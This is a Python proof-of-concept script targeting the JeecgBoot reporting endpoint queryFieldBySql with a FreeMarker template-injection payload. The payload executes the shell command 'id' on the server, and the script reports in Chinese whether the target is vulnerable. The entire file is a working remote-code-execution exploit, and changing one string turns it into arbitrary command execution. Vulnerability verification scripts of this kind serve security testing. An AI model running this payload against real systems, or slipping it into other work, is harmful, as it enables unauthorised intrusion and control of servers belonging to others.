#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib
import urllib3

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/jeecg-boot/jmreport/queryFieldBySql"
    burp0_headers = {"User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95", "Connection": "close", "Content-Type": "application/json;charset=UTF-8", "Accept-Encoding": "gzip"}
    burp0_json={"sql": "select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"id\")}'"}
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    info = r.json()["result"]["fieldList"]
    if "uid=" in str(info) and "gid=" in str(info):
        return str(info)
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 jeecgboot-queryFieldBySql-ssti.py ",target)
    data = verify(target)
    if data:
        print("[+]漏洞存在，执行命令 id 的结果为：", data)
    else:
        print("[-]漏洞不存在")
